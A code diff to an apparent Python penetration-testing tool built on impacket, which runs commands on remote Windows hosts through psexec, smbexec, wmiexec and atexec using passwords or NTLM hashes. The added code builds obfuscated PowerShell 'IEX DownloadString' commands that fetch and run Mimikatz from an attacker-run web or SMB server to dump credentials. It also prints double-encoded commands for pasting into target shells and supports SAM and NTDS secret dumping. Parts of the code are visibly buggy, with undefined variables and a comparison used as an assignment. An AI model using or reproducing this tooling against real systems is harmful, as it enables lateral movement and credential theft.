@@ -1,4 +1,98 @@
 #!/usr/bin/env python
+'''
+This pre-section contains the code from the impacket libraries and examples.
+This code falls under the licenses perscribed by that code distribution.
+'''
+try:
+    from impacket import smbserver, version
+    from impacket import version, ntlm
+    from impacket.dcerpc.v5 import transport, dcomrt
+    from impacket.dcerpc.v5.dtypes import NULL
+    from impacket.dcerpc.v5.dcom import wmi
+    from impacket.dcerpc.v5.dcomrt import DCOMConnection
+    from impacket.examples import logger
+except Exception as e:
+    print("[!] The following error occured %s") % (e)
+    sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
+
+    class WMIQUERY(cmd.Cmd):
+        def __init__(self, iWbemServices):
+            cmd.Cmd.__init__(self)
+            self.iWbemServices = iWbemServices
+            self.prompt = 'WQL> '
+            self.intro = '[!] Press help for extra shell commands'
+
+        def do_help(self, line):
+            print """
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     describe {class}           - describes class
+     ! {cmd}                    - executes a local shell cmd
+     """
+
+        def do_shell(self, s):
+            os.system(s)
+
+        def do_describe(self, sClass):
+            sClass = sClass.strip('\n')
+            if sClass[-1:] == ';':
+                sClass = sClass[:-1]
+            try:
+                iObject, _ = self.iWbemServices.GetObject(sClass)
+                iObject.printInformation()
+                iObject.RemRelease()
+            except Exception, e:
+                #import traceback
+                #print traceback.print_exc()
+                logging.error(str(e))
+
+        def do_lcd(self, s):
+            if s == '':
+                print os.getcwd()
+            else:
+                os.chdir(s)
+
+        def printReply(self, iEnum):
+            printHeader = True
+            while True:
+                try:
+                    pEnum = iEnum.Next(0xffffffff,1)[0]
+                    record = pEnum.getProperties()
+                    if printHeader is True:
+                        print '|',
+                        for col in record:
+                            print '%s |' % col,
+                        print
+                        printHeader = False
+                    print '|',
+                    for key in record:
+                        print '%s |' % record[key]['value'],
+                    print
+                except Exception, e:
+                    #import traceback
+                    #print traceback.print_exc()
+                    if str(e).find('S_FALSE') < 0:
+                        raise
+                    else:
+                        break
+            iEnum.RemRelease()
+
+        def default(self, line):
+            line = line.strip('\n')
+            if line[-1:] == ';':
+                line = line[:-1]
+            try:
+                iEnumWbemClassObject = self.iWbemServices.ExecQuery(line.strip('\n'))
+                self.printReply(iEnumWbemClassObject)
+                iEnumWbemClassObject.RemRelease()
+            except Exception, e:
+                logging.error(str(e))
+
+        def emptyline(self):
+            pass
+
+        def do_exit(self, line):
+            return True
 
 '''
 Author: Christopher Duffy
@@ -28,7 +122,7 @@ INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT
 LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '''
-import base64, sys, argparse, re, subprocess, os, time, logging
+import base64, sys, argparse, re, subprocess, os, time, logging, signal
 
 try:
     import netifaces
@@ -38,16 +132,33 @@ try:
     import netaddr
 except:
     sys.exit("[!] Install the netaddr library: pip install netaddr")
-try:
-    import wmi_client_wrapper as wmi
-except:
-    sys.exit("[!] Install the wmi_client_wrapper library: pip install wmi_client_wrapper && apt-get install wmi-client")
+#try:
+#    import wmi_client_wrapper as wmi
+#except:
+#    sys.exit("[!] Install the wmi_client_wrapper library: pip install wmi_client_wrapper && apt-get install wmi-client")
 try:
     import psexec, smbexec, atexec, netview, wmiexec, secretsdump
     from impacket import smbserver, version
 except Exception as e:
     print("[!] The following error occured %s") % (e)
     sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
+
+class Timeout():
+    """Timeout class using ALARM signal."""
+    class Timeout(Exception):
+        pass
+    def __init__(self, sec):
+        self.sec = sec
+
+    def __enter__(self):
+        signal.signal(signal.SIGALRM, self.raise_timeout)
+        signal.alarm(self.sec)
+
+    def __exit__(self, *args):
+        signal.alarm(0)    # disable alarm
+
+    def raise_timeout(self, *args):
+        raise Timeout.Timeout()
 
 class TargetConverter:
     def __init__(self, target):
@@ -143,7 +254,7 @@ class NetviewDetails:
 
 
 class Obfiscator:
-    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, delivery, dst_ip="", dst_port=""):
+    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, delivery, share_name, dst_ip="", dst_port=""):
         self.src_ip = src_ip
         self.dst_ip = dst_ip
         self.dst_port = dst_port
@@ -157,6 +268,7 @@ class Obfiscator:
         self.command = ""
         self.unprotected_command = ""
         self.delivery = delivery
+        self.share_name = share_name
         try:
             self.run()
         except Exception, e:
@@ -196,16 +308,25 @@ class Obfiscator:
 
     def invoker(self):
         # Invoke Mimikatz Directly
-        text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+        if self.delivery == "web":
+            text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+        if self.delivery == "smb":
+            text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function), str(self.argument))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
 
     def executor(self):
         # Invoke a PowerShell Script Directly
-        if self.argument:
-            text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
-        else:
-            text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
+        if self.delivery == "web":
+            if self.argument:
+                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+            else:
+                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
+        elif self.delivery == "smb":
+            if self.argument:
+                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function), str(self.argument))
+            else:
+                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
 
@@ -279,11 +400,12 @@ def hash_test(LM, NTLM, pwd):
     pwd = ""
     return(LM, NTLM, pwd, hash)
 
-def delivery_server(port, working_dir, delivery_method):
+def delivery_server(port, working_dir, delivery_method, share_name):
+    sub_proc = None
     if delivery_method == "web":
         sub_proc = http_server(port, working_dir)
     if delivery_method == "smb":
-        sub_proc == smb_server(working_dir)
+        sub_proc == smb_server(working_dir, share_name)
     return sub_proc
 
 def http_server(port, working_dir):
@@ -292,16 +414,49 @@ def http_server(port, working_dir):
     #time.sleep(1)
     return sub_proc
 
-def smb_server(working_dir):
+def smb_server(working_dir, share_name):
+
     note = ''
     smb_srv = smbserver.SimpleSMBServer()
-    smb_srv.addShare(options.shareName.upper(), working_dir, note)
+    smb_srv.addShare(share_name.upper(), working_dir, note)
     smb_srv.setSMB2Support(False)
     smb_srv.setSMBChallenge('')
     smb_srv.setLogFile('')
     sub_proc = subprocess.Popen([smb_srv.start()])
     return sub_proc
 
+def wmi_test(usr, pwd, dom, dst, hash, aes, kerberos):
+    if hash:
+        LM, NTLM = hash.split(":")
+    else:
+        LM = ''
+        NTLM  = ''
+    namespace = '//./root/cimv2'
+    try:
+        with Timeout(3):
+           connection = DCOMConnection(dst, usr, pwd, dom, LM, NTLM, aes, oxidResolver = True, doKerberos = kerberos)
+
+           wmi_int = connection.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
+           wmi_login = wmi.IWbemLevel1Login(wim_init)
+           wmi_services = wmi_login.NTLMLogin(namespace, NULL, NULL)
+           wmi_login.RemRelease()
+
+           wmi_shell = WMIQUERY(wmi_services)
+           wmi_shell.onecmd("SELECT * FROM Win32_Processor")
+
+           wmi_services.RemRelease()
+           wmi_init.disconnect()
+    except Exception, e:
+        #logging.error(str(e))
+        if e == None:
+            e = "Time exceeded"
+        print("[!] An error occurred while querying the WMI service: %s") % (e)
+        try:
+            wmi_init.disconnect()
+        except:
+            pass
+
+'''
 def wmi_test(usr, pwd, dom, dst):
     output = None
     dom_usr = dom + "/" + usr
@@ -317,6 +472,7 @@ def wmi_test(usr, pwd, dom, dst):
         return(True)
     else:
         return(False)
+'''
 
 def main():
     # If script is executed at the CLI
@@ -369,15 +525,16 @@ Create Pasteable Double Encoded Script:
     remote_attack.add_argument("--aes", action="store", dest="aes_key", default=None, help="The AES Key Option")
     remote_attack.add_argument("--kerberos", action="store", dest="kerberos", default=False, help="The Kerberos option")
     remote_attack.add_argument("--share", action="store", default="ADMIN$", dest="share", help="The Share to execute against, the default is ADMIN$")
-    remote_attack.add_argument('--mode', action="store", dest="mode", choices={"SERVER","SHARE"}, default="SERVER", help="Mode to use for --smbexec, default is SERVER, which requires root access, SHARE does not")
-    remote_attack.add_argument("--protocol", action="store", dest="protocol", choices={"445/SMB","139/SMB"}, default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
+    remote_attack.add_argument('--mode', action="store", dest="mode", choices=['SERVER','SHARE'], default="SERVER", help="Mode to use for --smbexec, default is SERVER, which requires root access, SHARE does not")
+    remote_attack.add_argument("--protocol", action="store", dest="protocol", choices=['445/SMB','139/SMB'], default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
     remote_attack.add_argument("--directory", action="store", dest="directory", default="C:\\", help="The directory to either drop the payload or instantiate the session")
     sam_dump_options.add_argument("--system", action="store", help="The SYSTEM hive to parse")
     sam_dump_options.add_argument("--security", action="store", help="The SECURITY hive to parse")
     sam_dump_options.add_argument("--sam", action="store", help="The SAM hive to parse")
     sam_dump_options.add_argument("--ntds", action="store", help="The NTDS.DIT file to parse")
     obfiscation.add_argument("--encoder", action="store_true", help="Set to encode the commands that are being executed")
-    obfiscation.add_argument("--delivery", action="store", dest="delivery", choices={"web","smb"}, default="web", help="Set the type of catapult server the payload will be downloaded from, web or smb")
+    obfiscation.add_argument("--delivery", action="store", dest="delivery", choices=['web','smb'], default="web", help="Set the type of catapult server the payload will be downloaded from, web or smb")
+    obfiscation.add_argument("--share-name", action="store", dest="share_name", default="ranger", help="Provide a specific share name to reference with SMB delivery")
     parser.add_argument("-l", "--logfile", action="store", dest="log", default="results.log", type=str, help="The log file to output the results")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
@@ -406,6 +563,7 @@ Create Pasteable Double Encoded Script:
     verbose = args.verbose             # Verbosity level
     src_port = args.src_port           # Port to source the Mimikatz script on
     delivery = args.delivery
+    share_name = args.share_name
     log = args.log
     if ".log" not in log:
         log = log + ".log"
@@ -465,6 +623,7 @@ Create Pasteable Double Encoded Script:
     method_dict = {}
     dst = ""
     test = ""
+    srv = None
 
     # Configure logger formats for STDERR and output file
     file_handler.setFormatter(format)
@@ -484,7 +643,7 @@ Create Pasteable Double Encoded Script:
         payload = ''.join(payload)
     elif delivery == "web":
         cwd = "/opt/ranger/web"
-    elif deliver == "smb":
+    elif delivery == "smb":
         cwd = "/opt/ranger/smb"
         src_port = 445
 
@@ -496,7 +655,7 @@ Create Pasteable Double Encoded Script:
     if smbexec_cmd or wmiexec_cmd or psexec_cmd or atexec_cmd:
         methods = True
 
-    if invoker and payload == None and methods == False:
+    if invoker  == None and methods == False:
         print("[!] This script requires either a command, an invoker attack, or a downloader attack")
         parser.print_help()
         sys.exit(1)
@@ -595,23 +754,23 @@ Create Pasteable Double Encoded Script:
             mim_arg = "-DumpCreds"
         if payload == None:
             payload = "im.ps1"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
         command, unprotected_command = x.return_command()
     elif executor:
-        if None in payload or None in mim_func:
+        if not payload or not mim_func:
             sys.exit("[!] You must provide at least the name tool to be injected into memory and the cmdlet name to be executed")
         execution = "executor"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
         command, unprotected_command = x.return_command()
     elif downloader:
         if delivery == "smb":
             sys.exit("[!] The Metasploit web_delivery module only works through web server based attacks")
         execution = "downloader"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
         command, unprotected_command = x.return_command()
     elif group:
         execution = "group"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
         command, unprotected_command = x.return_command()
     elif netview_cmd:
         attacks = True
@@ -623,27 +782,45 @@ Create Pasteable Double Encoded Script:
     if not attacks and not methods:
         sys.exit("[!] You need to provide ranger with details necessary to execute relevant attacks and methods")
 
-    if "invoker" in execution and not wmiexec_cmd:
-        supplement = '''[*] Place the PowerShell script ''' + str(payload) + ''' in an empty directory.
+    if "web" in delivery and "invoker" or "executor" in execution:
+        prep = '''[*] Place the PowerShell script ''' + str(payload) + ''' in an empty directory, or use the default /opt/ranger/web.
 [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + str(src_port) + '''.'''
-    elif "downloader" in execution and not wmiexec_cmd:
-        supplement = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
+        post = '''[*] Copy and paste one of the following commands into the target boxes command shell.
+[+] This command is unencoded:\n''' + unprotected_command + '''\n
+[+] This command is double encoded:\n''' +command
+        if smbexec_cmd:
+            instructions = post
+        else:
+            instructions = prep + post
+    elif "smb" in delivery and "invoker" or "executor" in execution:
+        prep = '''[*] Place the PowerShell script ''' + str(payload) + ''' in an empty directory, or use the default /opt/ranger/smb.
+[*] Start-up your samba server.'''
+        post ='''[*] Copy and paste one of the following commands into the target boxes command shell.
+[+] This command is unencoded:\n''' + unprotected_command + '''\n
+[+] This command is double encoded:\n''' + command
+        if smbexec_cmd:
+            instructions = post
+        else:
+            instructions = prep + post
+    elif "downloader" in execution:
+        prep = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
 [*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''
-    elif "group" in execution and not wmiexec_cmd:
-        supplement = '''[*] This script will identify Members of the Group: ''' + str(group) + ''' with PowerShell.'''
-    instructions = supplement + '''
-[*] Then copy and paste the following command into the target boxes command shell.
-[*] This execution script is double encoded.
-'''
+        post = '''[*] Copy and paste one of the following commands into the target boxes command shell.
+[+] This command is unencoded:\n''' + unprotected_command + '''\n
+[+] This command is double encoded:\n''' +command
+        if smbexec_cmd:
+           instructions = post
+        else:
+           instructions = prep + post
 
     if methods and sam_dump:
         sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
-    if not final_targets:
-        sys.exit("[!] No targets to exploit")
+    if not final_targets and not execution:
+        sys.exit("[!] No targets to exploit or commands to provide")
     if psexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = delivery_server(src_port, cwd, delivery)
+                srv = delivery_server(src_port, cwd, delivery, share_name)
                 print("[*] Starting %s server on port %s in %s" ) % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -652,12 +829,12 @@ Create Pasteable Double Encoded Script:
             attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
             attack.run(dst)
             if attacks:
-                srv.terminate()
-                print("[*] Shutting down the catapult %s server") % (str(delivery))
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server") % (str(delivery))
     elif wmiexec_cmd:
         for dst in final_targets:
-            if attacks:
-                srv = delivery_server(src_port, cwd, delivery)
+            if attacks and encoder:
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -665,24 +842,31 @@ Create Pasteable Double Encoded Script:
                     print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
                 if command == "cmd.exe":
                     sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
-            if attacks and not encoder:
-                print(test)
-                test = wmi_test(usr, pwd, dom, dst)
+                test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 if test:
+                    srv = delivery_server(src_port, cwd, delivery, share_name)
+                    attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                    attack.run(dst)
+
+            if attacks and not encoder:
+                test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
+                if test:
+                    srv = delivery_server(src_port, cwd, delivery, share_name)
                     attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                     attack.run(dst)
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             else:
-                test = wmi_test(usr, pwd, dom, dst)
+                test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 if test:
                     attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                     attack.run(dst)
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             if attacks:
-                srv.terminate()
-                print("[*] Shutting down the catapult %s server") % (str(delivery))
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server") % (str(delivery))
     elif netview_cmd:
         for dst in final_targets:
             if methods:
@@ -697,7 +881,7 @@ Create Pasteable Double Encoded Script:
     elif smbexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = delivery_server(src_port, cwd, delivery)
+                srv = delivery_server(src_port, cwd, delivery, share_name)
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -706,12 +890,13 @@ Create Pasteable Double Encoded Script:
             attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
             attack.run(dst)
             if attacks:
-                srv.terminate()
-                print("[*] Shutting down the catapult %s server") % (str(delivery))
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server") % (str(delivery))
     elif atexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = delivery_server(src_port, cwd, delivery)
+                srv = delivery_server(src_port, cwd, delivery, share_name)
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -722,7 +907,7 @@ Create Pasteable Double Encoded Script:
             attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
             attack.play(dst)
             if attacks and not encoder:
-                srv = delivery_server(src_port, cwd, delivery)
+                srv = delivery_server(src_port, cwd, delivery, share_name)
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -733,8 +918,9 @@ Create Pasteable Double Encoded Script:
                 attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command)
                 attack.play(dst)
             if attacks:
-                srv.terminate()
-                print("[*] Shutting down the catapult %s server") % (delivery)
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server") % (delivery)
     elif sam_dump:
         for dst in final_targets:
             if hash:
@@ -748,7 +934,6 @@ Create Pasteable Double Encoded Script:
                 print("[!] An error occured during execution")
     else:
         print(instructions)
-        print(x.return_command())
 
 if __name__ == '__main__':
     main()
